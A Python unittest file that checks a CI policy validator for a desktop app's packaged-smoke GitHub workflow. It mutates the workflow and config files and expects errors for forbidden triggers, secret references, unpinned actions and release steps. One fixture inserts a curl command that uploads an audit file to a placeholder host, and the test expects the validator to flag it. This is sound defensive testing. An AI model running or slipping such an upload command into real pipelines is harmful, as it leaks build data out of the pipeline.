from __future__ import annotations

import copy
import importlib.util
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
SCRIPT = ROOT / "tools" / "check_packaged_smoke_policy.py"
SPEC = importlib.util.spec_from_file_location("check_packaged_smoke_policy", SCRIPT)
assert SPEC is not None and SPEC.loader is not None
CHECKER = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(CHECKER)


def inputs() -> dict[str, object]:
    return CHECKER.load_inputs()


def changed(current: dict[str, object], key: str, old: str, new: str) -> None:
    value = str(current[key])
    if old not in value:
        raise AssertionError(f"fixture marker missing: {old!r}")
    current[key] = value.replace(old, new, 1)


class PackagedSmokePolicyTests(unittest.TestCase):
    def test_current_engineering_smoke_boundary_is_consistent(self) -> None:
        self.assertEqual(CHECKER.validate_policy(inputs()), [])

    def test_policy_input_universe_is_closed(self) -> None:
        current = inputs()
        del current["bundle_audit"]
        self.assertIn(
            "packaged-smoke policy input set drifted",
            CHECKER.validate_policy(current),
        )

    def test_dispatch_tag_and_pull_request_target_triggers_fail(self) -> None:
        for trigger in ("  workflow_dispatch:\n", "  pull_request_target:\n", "    tags:\n"):
            with self.subTest(trigger=trigger.strip()):
                current = inputs()
                changed(current, "workflow", "concurrency:\n", trigger + "\nconcurrency:\n")
                self.assertTrue(
                    any("trigger" in error or "forbidden control" in error for error in CHECKER.validate_policy(current))
                )

    def test_duplicate_top_level_keys_and_step_skip_controls_fail(self) -> None:
        current = inputs()
        current["workflow"] = str(current["workflow"]) + "\njobs: {}\n"
        self.assertTrue(any("top-level key" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        changed(
            current,
            "workflow",
            "      - name: Build and audit locked Python sidecar",
            "      - name: Build and audit locked Python sidecar\n        if: false",
        )
        self.assertTrue(any("repository guard" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        changed(current, "workflow", "        shell: bash", "        shell: python")
        self.assertTrue(any("shell selection" in error for error in CHECKER.validate_policy(current)))

    def test_push_must_remain_main_only(self) -> None:
        current = inputs()
        changed(current, "workflow", "      - main\n", "      - '**'\n")
        self.assertIn(
            "workflow triggers must be exactly pull_request plus main push",
            CHECKER.validate_policy(current),
        )

    def test_permissions_environment_and_secrets_fail(self) -> None:
        mutations = (
            ("contents: read", "contents: write", "write permissions"),
            ("contents: read", "contents: read\n  issues: write", "permissions"),
            ("    runs-on: macos-15", "    environment: macos-signing\n    runs-on: macos-15", "Environment"),
            ("      CI: \"true\"", "      TOKEN: ${{ secrets.BAD }}\n      CI: \"true\"", "GitHub secrets"),
            ("      CI: \"true\"", "      TOKEN: ${{ secrets['BAD'] }}\n      CI: \"true\"", "GitHub secrets"),
        )
        for old, new, expected in mutations:
            with self.subTest(expected=expected):
                current = inputs()
                changed(current, "workflow", old, new)
                self.assertTrue(any(expected in error for error in CHECKER.validate_policy(current)))

    def test_actions_must_be_full_sha_pinned_and_allowlisted(self) -> None:
        current = inputs()
        changed(current, "workflow", CHECKER.CHECKOUT_SHA, "v6")
        errors = CHECKER.validate_policy(current)
        self.assertTrue(any("action" in error for error in errors))

    def test_checkout_and_source_sha_cannot_fall_back_to_pr_merge(self) -> None:
        current = inputs()
        changed(
            current,
            "workflow",
            f"LCF_SOURCE_SHA: {CHECKER.SOURCE_EXPRESSION}",
            "LCF_SOURCE_SHA: ${{ github.sha }}",
        )
        errors = CHECKER.validate_policy(current)
        self.assertTrue(any("exact-source" in error for error in errors))

        current = inputs()
        changed(current, "workflow", "persist-credentials: false", "persist-credentials: true")
        errors = CHECKER.validate_policy(current)
        self.assertTrue(any("exact-source" in error for error in errors))

    def test_artifact_cache_release_and_app_launch_surfaces_fail(self) -> None:
        additions = (
            "      - uses: actions/upload-artifact@" + "a" * 40 + "\n",
            "      - uses: actions/cache@" + "a" * 40 + "\n",
            "      - run: gh release create v0.0.0\n",
            "      - run: /usr/bin/open 'release-smoke/App.app'\n",
            "      - run: release-smoke/App.app/Contents/MacOS/App\n",
            "      - run: spctl --assess release-smoke/App.app\n",
        )
        for addition in additions:
            with self.subTest(addition=addition.strip()):
                current = inputs()
                current["workflow"] = str(current["workflow"]) + addition
                self.assertTrue(CHECKER.validate_policy(current))

    def test_python_source_urls_and_digests_are_locked(self) -> None:
        current = inputs()
        changed(current, "workflow", CHECKER.PYTHON_ARCHIVE_SHA256, "0" * 64)
        self.assertTrue(any("Python source lock" in error for error in CHECKER.validate_policy(current)))

    def test_required_commands_cannot_be_satisfied_by_comments(self) -> None:
        current = inputs()
        changed(
            current,
            "workflow",
            "        run: make python-sidecar-build",
            "        run: |\n          # make python-sidecar-build\n          true",
        )
        errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any("run-step contract" in error or "required command" in error for error in errors)
        )

    def test_unreviewed_outbound_upload_command_fails(self) -> None:
        current = inputs()
        changed(
            current,
            "workflow",
            '          cat "${audit_json}"',
            '          cat "${audit_json}"\n          curl --upload-file "${audit_json}" https://example.invalid/evidence',
        )
        self.assertTrue(
            any("run-step contract" in error for error in CHECKER.validate_policy(current))
        )

    def test_only_locked_python_installer_spctl_is_allowed(self) -> None:
        current = inputs()
        current["makefile"] = str(current["makefile"]) + "\n\t/usr/sbin/spctl --assess Bad.app\n"
        self.assertTrue(any("spctl" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        changed(
            current,
            "makefile",
            '/usr/sbin/spctl --assess --type install --verbose=4 "$(PYTHON_SIDECAR_INSTALLER)"',
            "true",
        )
        self.assertTrue(any("spctl" in error for error in CHECKER.validate_policy(current)))

    def test_generic_desktop_or_companion_build_fails(self) -> None:
        current = inputs()
        changed(
            current,
            "workflow",
            "npm --prefix desktop run build:engineering-smoke",
            "npm --prefix desktop run build",
        )
        errors = CHECKER.validate_policy(current)
        self.assertTrue(any("generic build" in error or "required command" in error for error in errors))

        current = inputs()
        package = copy.deepcopy(current["package"])
        package["scripts"]["build:engineering-smoke"] = "npm run build:companion"
        current["package"] = package
        self.assertTrue(any("engineering build" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        package = copy.deepcopy(current["package"])
        package["scripts"]["build:preload:engineering-smoke"] = "npm run build:companion"
        current["package"] = package
        self.assertTrue(any("script" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        package = copy.deepcopy(current["package"])
        package["devDependencies"]["@electron/asar"] = "^3.4.1"
        current["package"] = package
        self.assertTrue(any("ASAR auditor dependency" in error for error in CHECKER.validate_policy(current)))

    def test_smoke_config_cannot_extend_formal_or_add_release_targets(self) -> None:
        additions = (
            "\nextends: electron-builder.yml\n",
            "\n  - target: dmg\n",
            "\npublish:\n  provider: github\n",
            "\n  - from: generated/qmd\n    to: qmd\n",
            "\n  - from: resources/update\n    to: update\n",
        )
        for addition in additions:
            with self.subTest(addition=addition.strip()):
                current = inputs()
                current["smoke_config"] = str(current["smoke_config"]) + addition
                self.assertTrue(CHECKER.validate_policy(current))

        current = inputs()
        changed(
            current,
            "smoke_config",
            "appId: dev.localcontextforge.engineering-smoke",
            "# appId: dev.localcontextforge.engineering-smoke\nappId: dev.example.evil",
        )
        self.assertTrue(any("allowlist" in error for error in CHECKER.validate_policy(current)))

    def test_formal_boundary_cannot_reference_smoke_config(self) -> None:
        current = inputs()
        current["formal_workflow"] = (
            str(current["formal_workflow"]) + "\n# electron-builder.smoke.yml\n"
        )
        self.assertTrue(any("formal workflow" in error for error in CHECKER.validate_policy(current)))

    def test_engineering_hooks_cannot_import_formal_release_logic(self) -> None:
        current = inputs()
        current["before_pack"] = str(current["before_pack"]) + '\nrequire("./prepareRelease.cjs");\n'
        self.assertTrue(any("formal boundary" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        current["after_pack"] = str(current["after_pack"]) + '\nrequire("./resealPackagedRuntimes.cjs");\n'
        self.assertTrue(any("formal boundary" in error for error in CHECKER.validate_policy(current)))

    def test_bundle_auditor_cannot_launch_the_app(self) -> None:
        current = inputs()
        current["bundle_audit"] = (
            str(current["bundle_audit"])
            + '\nexecFileSync("release-smoke/App.app/Contents/MacOS/App");\n'
        )
        self.assertTrue(any("launch" in error for error in CHECKER.validate_policy(current)))

    def test_manifest_schema_cannot_be_open_or_publishable(self) -> None:
        current = inputs()
        schema = copy.deepcopy(current["schema"])
        schema["additionalProperties"] = True
        current["schema"] = schema
        self.assertTrue(any("additional properties" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        schema = copy.deepcopy(current["schema"])
        schema["properties"]["distribution"]["properties"]["publishable"]["const"] = True
        current["schema"] = schema
        self.assertTrue(any("constant" in error for error in CHECKER.validate_policy(current)))

    def test_w02_status_cannot_regress_or_promote_the_gate(self) -> None:
        current = inputs()
        changed(
            current,
            "todo",
            "| TODO-PACKAGED-SMOKE-001 | Priority-0 | W02 | `in-progress` |",
            "| TODO-PACKAGED-SMOKE-001 | Priority-0 | W02 | `planned` |",
        )
        self.assertTrue(any("W02 TODO" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        row = next(
            line
            for line in str(current["trace"]).splitlines()
            if line.startswith("| VAL-PACKAGED-SMOKE-001 |")
        )
        current["trace"] = str(current["trace"]).replace(
            row, row.replace("`not-run`", "`pass`", 1), 1
        )
        self.assertTrue(any("canonically not-run" in error for error in CHECKER.validate_policy(current)))

    def test_w02a_cannot_become_a_stable_id(self) -> None:
        current = inputs()
        current["iteration"] = str(current["iteration"]) + "\nTODO-W02A-001\n"
        self.assertTrue(any("stable ID" in error for error in CHECKER.validate_policy(current)))


if __name__ == "__main__":
    unittest.main()
